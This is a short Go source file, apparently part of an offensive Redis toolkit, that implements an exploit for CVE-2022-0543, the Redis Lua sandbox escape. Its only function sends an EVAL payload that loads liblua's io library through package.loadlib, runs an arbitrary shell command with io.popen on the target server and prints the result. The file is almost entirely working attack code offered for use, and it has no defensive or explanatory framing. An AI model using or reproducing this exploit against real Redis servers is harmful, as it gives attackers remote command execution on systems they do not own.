package pkg

import (
	"context"
	"fmt"
	"github.com/axgle/mahonia"
)

// RedisLua Lua沙盒绕过命令执行 CVE-2022-0543
func RedisLua(cmd string) {
	ctx := context.Background()

	val, err := Rdb.Do(ctx, "eval", fmt.Sprintf(`local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("%v", "r"); local res = f:read("*a"); f:close(); return res`, cmd), "0").Result()
	if err != nil {
		Err(err)
		return
	}
	fmt.Println(mahonia.NewDecoder("gbk").ConvertString(val.(string)))
}
